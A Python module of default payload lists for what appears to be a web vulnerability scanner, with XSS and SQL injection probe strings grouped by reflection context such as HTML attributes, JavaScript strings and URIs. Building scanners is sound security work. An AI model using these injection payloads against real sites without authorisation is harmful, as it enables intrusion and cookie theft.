from __future__ import annotations

DEFAULTS: dict[str, list[str]] = {
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><script>alert(1)</script>",
        "'\"><svg/onload=alert(1)>",
    ],
    "sqli": [
        "'",
        "1' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
    ],
}

# Per-context payload defaults for the reflection-context classifier.
# Each key is a context tag name matching ContextType values used by XSSPlugin.
CONTEXT_DEFAULTS: dict[str, dict[str, list[str]]] = {
    "xss": {
        "html_body": [
            "<svg onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<body onload=alert(1)>",
        ],
        "attr_double": [
            '"><svg onload=alert(1)>',
            '" onmouseover="alert(1)',
            '"><img src=x onerror=alert(1)>',
            '" onfocus="alert(1)" autofocus="',
        ],
        "attr_single": [
            "'><svg onload=alert(1)>",
            "' onmouseover='alert(1)",
            "'><img src=x onerror=alert(1)>",
        ],
        "attr_unquoted": [
            " onmouseover=alert(1) x=",
            " onfocus=alert(1) autofocus ",
        ],
        "js_string": [
            '";alert(1);//',
            "';alert(1);//",
            '\\";alert(1);//',
            "'-alert(1)-'",
        ],
        "js_block": [
            "alert(1)",
            "};alert(1);//",
        ],
        "uri": [
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
        ],
        "html_comment": [
            "--><svg onload=alert(1)>",
            "--><img src=x onerror=alert(1)>",
        ],
    },
}
